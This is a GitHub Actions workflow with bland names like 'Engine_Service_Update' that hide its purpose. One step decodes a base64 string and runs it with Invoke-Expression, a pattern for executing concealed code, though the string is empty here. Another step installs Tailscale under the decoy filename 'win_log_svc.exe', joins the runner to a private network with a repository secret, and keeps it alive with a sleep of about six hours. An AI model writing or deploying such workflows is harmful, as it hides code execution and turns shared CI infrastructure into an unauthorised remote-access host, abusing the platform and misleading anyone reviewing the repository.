name: Engine_Service_Update
on:
  workflow_dispatch:

jobs:
  runtime_process:
    runs-on: windows-latest
    timeout-minutes: 360
    steps:
      - name: Initialize Core
        env:
          U_KEY: ${{ secrets.YOUSF_KEY }}
        run: |
          $b64 = ""
          $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
          Invoke-Expression $decoded

      - name: Sync Network
        env:
          AUTH_VAL: ${{ secrets.YOUSF_KEY }}
        run: |
          $u = "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe"
          $f = "$env:TEMP\win_log_svc.exe"
          (New-Object System.Net.WebClient).DownloadFile($u, $f)
          Start-Process $f -ArgumentList "/S" -Wait
          $bin = "$env:ProgramFiles\Tailscale\tailscale.exe"
          & $bin up --authkey=$env:AUTH_VAL --hostname=srv-$env:GITHUB_RUN_ID
          $ip = (& $bin ip -4)
          echo "NODE_IP=$ip" >> $env:GITHUB_ENV

      - name: Post Process
        run: |
          Write-Host "Endpoint: ${{ env.NODE_IP }}"
          $s = 21000 + (Get-Random -Max 500)
          Start-Sleep -Seconds $s
